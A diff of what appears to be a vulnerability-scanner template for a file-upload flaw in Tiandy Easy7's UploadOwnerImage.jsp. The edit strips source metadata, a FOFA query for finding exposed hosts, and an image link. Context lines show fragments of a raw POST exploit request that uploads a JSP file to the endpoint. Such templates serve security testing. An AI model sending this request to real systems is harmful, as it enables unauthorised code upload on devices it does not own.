@@ -3,12 +3,8 @@ info:
   name: 天地伟业Easy7 UploadOwnerImage存在文件上传漏洞_nx6ml28xlfug8vcp
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  description: ''
   tags: file-upload,unknown
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ''
-    fofa: app="Tiandy-Easy7"
 http:
 - raw:
   - 'POST /Easy7/apps/WebService/UploadOwnerImage.jsp HTTP/1.1
@@ -51,9 +47,7 @@ http:
 
     </jsp:root>
 
-    ------geckoformboundaryf079b5206c15039ed1e6fe97927beff5--
-
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1776660905111-986a77e7-0cec-4a60-91fe-d89552b897bf.png)'
+    ------geckoformboundaryf079b5206c15039ed1e6fe97927beff5--'
   redirects: false
   matchers:
   - status:
